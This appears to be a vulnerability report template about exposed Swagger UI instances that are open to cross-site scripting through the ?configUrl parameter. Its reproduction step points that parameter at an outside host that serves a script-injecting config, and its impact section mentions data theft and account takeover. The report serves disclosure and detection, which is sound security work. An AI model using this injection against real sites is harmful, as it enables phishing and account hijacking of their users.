# Detect exposed Swagger UI

#### Description
Swagger UI is a web interface for interacting with a web API defined using the OpenAPI (formerly known as Swagger) specification. It allows you to visualize and interact with the API's resources without having to write any code.

Some old Swagger UI versions are vulnerable to XSS by overwriting their configuration with the `?configUrl` or `?url` parameter. By doing so, you can override the page to do a malicious act, while it still has a trustworthy URL. And no authentication is needed to exploit this vulnerability

#### Steps to reproduce (with ?configUrl=):
1. Go to: {{endpoint}}?configUrl=https://jumpy-floor.surge.sh/test.json
2. You should see an alert box (screenshot attached)

#### Impact:
This vulnerability allows an attacker to inject and execute arbitrary script code within the context of a user's web browser. This malicious script code can be used to steal sensitive user information, perform phishing attacks, or even gain unauthorised access to the user's account.

#### Resources / Supporting Material:
- https://www.vidocsecurity.com/blog/hacking-swagger-ui-from-xss-to-account-takeovers/
- https://app.vidocsecurity.com/public-library/787db825-d8c0-4182-a79f-6c7520745c49
